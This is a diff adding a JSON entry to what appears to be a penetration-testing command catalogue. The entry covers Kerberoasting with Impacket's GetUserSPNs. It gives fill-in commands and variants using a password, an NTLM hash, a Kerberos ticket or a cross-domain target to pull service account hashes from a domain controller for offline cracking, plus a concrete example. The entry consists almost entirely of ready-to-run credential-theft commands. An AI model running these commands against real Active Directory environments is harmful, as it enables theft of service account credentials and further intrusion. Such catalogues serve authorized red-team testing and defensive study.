@@ -1,0 +1,40 @@
+{
+  "id": "kerberoasting",
+  "name": "Impacket Kerberoast",
+  "command": "impacket-GetUserSPNs -request -dc-ip '<ip>' '<domain>/<user>:<password>' -outputfile kerberoasting.hashes",
+  "description": "Extract service account hashes via Kerberoasting",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "kerberos"
+  ],
+  "tags": [
+    "impacket",
+    "kerberoast",
+    "spn",
+    "service-account",
+    "hash"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "impacket-GetUserSPNs -request -dc-ip '<ip>' -hashes ':<hash>' '<domain>/<user>' -outputfile kerberoasting.hashes"
+    },
+    {
+      "label": "Kerberos Ticket",
+      "requires": "ticket",
+      "command": "impacket-GetUserSPNs -request -dc-ip '<ip>' -k -no-pass '<domain>/<user>' -outputfile kerberoasting.hashes"
+    },
+    {
+      "label": "Cross-Domain",
+      "requires": "password",
+      "command": "impacket-GetUserSPNs -request '<domain>/<user>:<password>' -outputfile kerberoasting.hashes -target-domain '<target_domain>'"
+    }
+  ],
+  "examples": [
+    "impacket-GetUserSPNs -request -dc-ip '192.168.1.100' 'CORP/user:password' -outputfile kerberoasting.hashes"
+  ]
+}
